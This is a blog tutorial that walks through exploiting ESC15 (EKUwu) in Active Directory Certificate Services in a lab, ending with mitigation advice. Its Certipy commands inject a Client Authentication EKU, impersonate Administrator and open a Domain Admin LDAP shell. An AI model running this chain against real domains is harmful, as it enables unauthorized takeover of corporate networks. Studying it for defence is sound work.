<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a></span>            </div>
            <h1 class="post-title entry-title">ADCS ESC15 – Exploiting Template Schema v1</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/adcs-esc15-exploiting-template-schema-v1/" rel="bookmark"><time class="entry-date published" datetime="2025-07-12T12:33:47+00:00">July 12, 2025</time><time class="updated" datetime="2025-07-19T15:39:55+00:00">July 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">The <strong>ESC15 vulnerability</strong> (EKUwu), affects <strong>Active Directory Certificate Services (AD CS)</strong>, allowing attackers to inject unauthorized <strong>EKUs</strong> (e.g., <strong>Client Authentication</strong>) into <strong>Schema Version 1</strong> templates. This flaw enables <strong>privilege escalation</strong>, bypassing security restrictions and granting unauthorized access. Organizations using AD CS must act quickly to mitigate this high risk <strong>security issue</strong>.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Overview the ESC15 Attack</strong></span></li>
<li><span style="color: #000000;"><strong>What is Schema Version 1?</strong></span></li>
<li><span style="color: #000000;"><strong>Prerequisites</strong></span></li>
<li><span style="color: #000000;"><strong>Lab Setup</strong></span></li>
<li><span style="color: #000000;"><strong>Enumeration &amp; Exploitation </strong></span></li>
<li><span style="color: #000000;"><strong>Post Exploitation</strong></span></li>
<li><span style="color: #000000;"><strong>Mitigation</strong></span></li>
</ul>
<h3><span style="color: #800000;">Overview the ESC15 Attack</span></h3>
<p><span style="color: #000000;"><strong>ESC15 (EKUwu)</strong> is a post-compromise attack on <strong>Active Directory Certificate Services (AD CS)</strong>, exploiting a logic flaw in <strong>Schema v1</strong> certificate templates. This flaw occurs because the <strong>Certificate Authority (CA)</strong> doesn’t properly enforce <strong>Extended Key Usage (EKU)</strong> restrictions.</span></p>
<h4><span style="color: #800000;">Why is This Dangerous?</span></h4>
<ul>
<li><span style="color: #000000;">AD CS <strong>should only issue certificates with EKUs explicitly defined in the template.</strong></span></li>
<li><span style="color: #000000;">But in <strong>Schema v1 templates</strong>, attackers can inject <strong>arbitrary Application Policies (EKUs)</strong> during enrollment (like Client Authentication).</span></li>
<li><span style="color: #000000;">If successful, AD will issue a <strong>fully trusted certificate</strong>, allowing Kerberos PKINIT login as any user including Domain Admins.</span></li>
</ul>
<h4><span style="color: #800000;">Practical Impact</span></h4>
<p><span style="color: #000000;">Even hardened environments may keep legacy v1 templates (e.g., Web Server, User), which are exploitable if:</span></p>
<ul>
<li><span style="color: #000000;">Attackers can <strong>enroll certificates</strong></span></li>
<li><span style="color: #000000;">Templates allow <strong>“Supply in Request”</strong></span></li>
<li><span style="color: #000000;">EKU injection isn’t blocked</span></li>
</ul>
<p><span style="color: #000000;"><strong>Result:</strong> A low privileged user escalates to Domain Admin without touching passwords or hashes.</span></p>
<p><span style="color: #000000;"><em>Note: Many orgs thought removing Web Enrollment or disabling SAN injection was enough. EKUwu proves that even “safe” v1 templates can become a privilege escalation vector if not audited.</em></span></p>
<h3><span style="color: #800000;">What is Schema Version 1?</span></h3>
<p><span style="color: #000000;"><strong>Schema Version 1</strong> in <strong>AD CS</strong> is an older template format that defines certificate properties, like EKUs (Extended Key Usages), to control which users can request specific certificates.</span></p>
<p><span style="color: #000000;"><strong>ESC15 (EKUwu)</strong> takes advantage of a weakness in Schema Version 1. It lets attackers add unauthorized <strong>Application Policy OIDs</strong> (like Client Authentication) into certificate requests, skipping security checks. This allows users with low permissions to get certificates with higher access, leading to privilege escalation and access to sensitive systems.</span></p>
<p><span style="color: #000000;">Since Schema Version 1 is still common in older environments, many organizations remain vulnerable to this exploit.</span></p>
<h3><span style="color: #800000;">Prerequisite </span></h3>
<ul>
<li><span style="color: #000000;">Windows Server 2019 as Active Directory that supports PKINIT</span></li>
<li><span style="color: #000000;">Domain must have Active Directory Certificate Services and Certificate Authority configured.</span></li>
<li><span style="color: #000000;">Kali Linux packed with tools</span></li>
<li><span style="color: #000000;">Tools: <strong>Certipy v2</strong> (with ESC15 support)</span></li>
</ul>
<h3><span style="color: #800000;">Lab Setup</span></h3>
<p><span style="color: #000000;">This post looks at setups where <strong>Active Directory Certificate Services (AD CS)</strong> is already running and templates like <strong>Web Server</strong> are being used. It talks about what happens after an attacker has already broken in and is using the existing system. The first step is to check the <strong>CA</strong> settings and make sure the conditions for <strong>ESC15</strong> are in place before starting the attack.</span></p>
<p><span style="color: #000000;">Before exploiting, confirm the <strong>Web Server</strong> template is enabled and that your user (raj in our cae) has <strong>Enroll</strong> permissions:</span></p>
<p><span style="color: #000000;">Firstly, on the CA server, open <strong>Certification Authority</strong>.</span></p>
<p><span style="color: #000000;">Then, expand your CA → Right-click <strong>Certificate Templates → Manage</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTRuWyCg-tiTzb55kvCCnjD9q_mNehX7N1-gWiJkbG5izxcVjn-lTrnkEH0jtauhWIKHkhD0vABzwY8sS0Uv1lrHkhty9bEetzGjpj-B1qT0IXMkI6hyphenhyphen46sQ3NenK-r4RuEFxhk1hlkjLfrGnI6QGUKIlzvzaQpU1UBxh-ZtR8yS0tRawIc0fqioCzk-Hr/s16000/1.png"/></span></p>
<p><span style="color: #000000;">In the Certificate Templates console:</span></p>
<p><span style="color: #000000;">Locate <strong>Web Server</strong></span></p>
<p><span style="color: #000000;">Right-click → <strong>Properties</strong></span></p>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiBg10-NjSzvQNmEscqyVHAeyXOqLimjhwPZBYc1i_UCf_BcTmdeSfsksBfskxze0iMJxoOEqJiiv7kfRNNipuPuAmPDOf0JsgSo5Se7Uu0OOMjmJXHOF6yV3pmoHLltKmDjyYL2sxxmhh4qtcRgaNJEo-EFYpFp-Oxu3M7AYJ3awVIJAgqtwjNWcOWFHK_/s16000/2.png" alt="ADCS ESC15 Exploiting Template Schema" width="1181" height="1033"/></span></p>
<p><span style="color: #000000;"><strong>Under Web server Properties </strong></span></p>
<p><span style="color: #000000;">Now, Go to<strong> Security Tab</strong></span></p>
<p><span style="color: #000000;">Add raj (or your low privileged user)</span></p>
<p><span style="color: #000000;">Grant <strong>Enroll</strong> permission</span></p>
<p><span style="color: #000000;">Click <strong>Apply → OK</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4SGCeiro32TQT1-TtQM6rFGuq3NWII2JVoFwbiSHGVmoOfsFRLGedLX57fWASFAAnM5kczwsZp5WxJa17ZyuaGr44bK1496tg2cXXZn1-iexw7rPPuicyTD_dtpKI2hlCsnPTaphyHuJduAIf9_ZzK7dK4hS72OjOgWDB1QWEMM9C_XbavVqMcWiUjutL/s16000/3.png"/></span></p>
<p><span style="color: #000000;">This permission allows raj to request certificates using the Web Server template critical for the upcoming EKUwu attack.</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Enumeration &amp; Exploitation</span> </span></h3>
<p><span style="color: #000000;">Now let’s pivot to exploitation using the patched Certipy branch.</span></p>
<h4><span style="color: #800000;">Clone EKUwu-Supported Certipy</span></h4>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone -b esc15-ekuwu --single-branch https://github.com/dru1d-foofus/Certipy</pre>
<p><span style="color: #000000;">This command clones the <strong>Certipy</strong> branch with <strong>ESC15 (EKUwu)</strong> support, using the –single-branch flag to only fetch the EKUwu branch and avoid unnecessary data, as the standard version of <strong>Certipy</strong> doesn’t support EKU injection, whereas this patched branch by <strong>dru1d-foofus</strong> enables ESC15 exploitation.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsVlDOGDY7X5cQKaJwnt1QeJunTg_sEsBuI5uWXfas0uT3ywNWw_xfS5pvOpzmAEvpK2pS8FUaYbSP9UDBNC_KuCQZydgs2HNOS7dB-xMxihaTALl_Lcc_FHb4od-XxJvPW970ZHJl5gwZD6-z83eqhJIQ36_ckyKqov2MpRnVLLxCe7PNAAEZXKhPfLDF/s16000/4.png" alt="ADCS ESC15 Exploiting Template Schema" width="1149" height="241"/></span></p>
<p><span style="color: #000000;">After cloning the <strong>Certipy</strong> repository, running the installation command sets up <strong>Certipy</strong> locally, enabling the <strong>ESC15 (EKUwu)</strong> functionality for <strong>template abuse</strong> and <strong>EKU injection</strong>, which is essential for exploiting the vulnerability.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd Certipy/
python3 setup.py install</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVsl4xAo200xo8hA2zWvWMjUtbUHy5QxQ7fWApbe2qYmLOhGPztrfNLwgiljoHTAoJsc5SV549ElR1u5uaznDVAzidGWEo28omTWpUXqfqg4yO2R7jsvv2mm0So7Q426WIcuyWJstppRkKm77fgMRxNxnNIsUZzne4Tt8Noq49NX5nZ8VJlpL-xkshjBbI/s16000/5.png"/></span></p>
<h4><span style="color: #800000;">Find Vulnerable Templates</span></h4>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy find -u 'raj@ignite.local' -p Password@1 -dc-ip 192.168.1.16 -vulnerable -enabled</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3xuSeW05UkIZ7qhRF8NHswGTtLUz4u3bSfGJ6NsFuvM3cm5q4RnKvU_r0TpkBVmcXjV-7ccBQi0vtrd_FT-CiDyYlgJtEEPIlck6I__mc1v4ic5P0zNIhvFnhcA95MhAFrShfSfWDMpPeU2zidglA30RXVDLtSdFwsICGPNK-ArgUHeMxt9NDj9LYgsYB/s16000/6.png"/></span></p>
<p><span style="color: #000000;">This scan looks for templates that allow enrollment and finds possible <strong>Schema v1</strong> options. It also checks if the <strong>Web Server</strong> template is available and has settings that can be used in an attack.</span></p>
<p><span style="color: #000000;">Then, we’ll examine the full details of the template, including the Schema version, EKUs (Extended Key Usages), and the individuals who are allowed to enroll. This helps us confirm that we can use the Web Server template for EKU injection and other actions.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6nJcdI6cqT6ipvj7-XqDDlEHHgGb-pw6-649ui5rEFdX5nEPoQos9I31FAU-3l_qs6yplwFJiL_ugu0boXgblDmBjkCuQogMKHfcz-7IQ01mbW0ZK2N69SU65ASl9KY7A8WcrYwEHoK9bAJVhBZmzrZFor0iHBq7yvuqKEL14UgDDYtLx46FfAcQvFow4/s16000/7.png" alt="ADCS ESC15 Exploiting Template Schema" width="1190" height="840"/></span></p>
<h4><span style="color: #800000;">Request Certificate with Injected EKU (EKUwu)</span></h4>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy req -dc-ip 192.168.1.16 -ca ignite-DC1-CA -target-ip 192.168.1.16 -u raj@ignite.local -p 'Password@1' -template WebServer -upn Administrator@ignite.local --application-policies 'Client Authentication'</pre>
<p><span style="color: #000000;">This command requests a certificate for <strong>raj</strong>, injecting the <strong>Client Authentication EKU</strong> which is not typically allowed by the <strong>Web Server</strong> template, exploiting the <strong>ESC15</strong> flaw where <strong>AD CS</strong> fails to sanitize EKU fields in <strong>Schema v1</strong>, resulting in a fully trusted certificate for <strong>Kerberos authentication</strong> as <strong>Administrator</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4g4UPbdKPq3oShnQSklexmMoe8kgZ4A0VG1lblmCHw3lBIFzcL9cJiVNAA4lRv4uWu0zAB1Fdo6Rxtjbx-ZG8tUxQ7Ujfc5fI_9X7vswqs79nAl-uv4WzkHFs7KDfgSagGrOzrLzzhDy03K6R30Uvvgk9eQOY9dShMoxsW0htJKtI6FArzR70YU8OaJor/s16000/8.png"/></span></p>
<h3><span style="color: #800000;">Post Exploitation</span></h3>
<h4><span style="color: #800000;">Authenticate Using the Forged Certificate</span></h4>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy auth -pfx administrator.pfx -dc-ip 192.168.1.16 -ldap-shell</pre>
<p><span style="color: #000000;">This command uses the rogue certificate (<strong>administrator.pfx</strong>) to authenticate as <strong>Administrator</strong>, exploiting AD’s trust in the injected EKU, granting <strong>LDAP shell access</strong> as <strong>Domain Admin</strong>.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhH-KEIcavqwJKqikvXgnPSYz6ltSPCAwZZH0WzhQv0gSo69af2qD90QURvLuW7WhlQygr868CQCCq7BbDCqQ-AhHCOcqb51IsVL_rLoGQyEkdTSPtmxyzULj3l1gt7gbT28qxU0J8c3g6Ss8PM_Kt070Ylb9YGftKNqU2qqaIRngHEN9bx8M_Mo4LqO_Xg/s16000/9.png" alt="ADCS ESC15 Exploiting Template Schema" width="1013" height="266"/></span></p>
<h3><span style="color: #800000;">Mitigation</span></h3>
<ul>
<li><span style="color: #000000;">Remove old Schema v1 templates so they can’t be used.</span></li>
<li><span style="color: #000000;">Move old templates to the newer <strong>Schema v2</strong> format</span></li>
<li><span style="color: #000000;">Make sure the CA settings strictly check EKUs</span></li>
<li><span style="color: #000000;">Regularly check given certificates for unusual EKUs</span></li>
<li><span style="color: #000000;">Patch to mitigate EKU injection (<strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019">CVE-2024-49019</a></span></strong>, Nov 2024)</span></li>
</ul>
<p><span style="color: #000000;"><strong>Author</strong>: MD Aslam drives security excellence and mentors teams to strengthen security across products, networks, and organizations as a dynamic Information Security leader. Contact</span> <strong><a href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
<!-- YARPP Thumbnails -->
<h3>Related posts:</h3>
<div class="yarpp-thumbnails-horizontal">
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/" title="ADCS ESC3: Enrollment Agent Template">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">ADCS ESC3: Enrollment Agent Template</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/" title="ADCS ESC4: Vulnerable Certificate Template Access Control">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">ADCS ESC4: Vulnerable Certificate Template Access Control</span></a>
</div>
</div>
            </div><!-- .entry-content -->
            <footer class="post-footer entry-footer">
                                                
            </footer><!-- .entry-footer -->
            
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/kerberoasting-attack-in-active-directory/" rel="prev">Kerberoasting Attack in Active Directory</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/aws-iam-assumerole-privilege-escalation/" rel="next">AWS: IAM AssumeRole Privilege Escalation</a></div></div>
	</nav>        </div>
